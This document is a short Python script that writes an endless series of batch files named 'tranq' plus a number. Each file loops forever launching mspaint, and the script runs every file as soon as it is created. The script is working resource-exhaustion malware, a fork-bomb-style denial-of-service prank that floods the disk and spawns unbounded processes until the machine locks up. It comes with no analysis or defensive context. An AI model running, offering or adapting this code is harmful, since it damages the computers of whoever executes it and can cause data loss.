#START
import os
RANGE = 999999999999
TEXT = "@Echo off"
NAME = "tranq"
TYPE = ".bat"
End = RANGE - 1
for x in range(0, RANGE):
    FINAL = NAME + str(x) + TYPE
    f = open(FINAL, "a")
    f.write(TEXT + '\n')
    f.write(":i" + '\n')
    f.write("start mspaint" + '\n')
    f.write("goto i")
    f.close()
    os.system(FINAL)
#END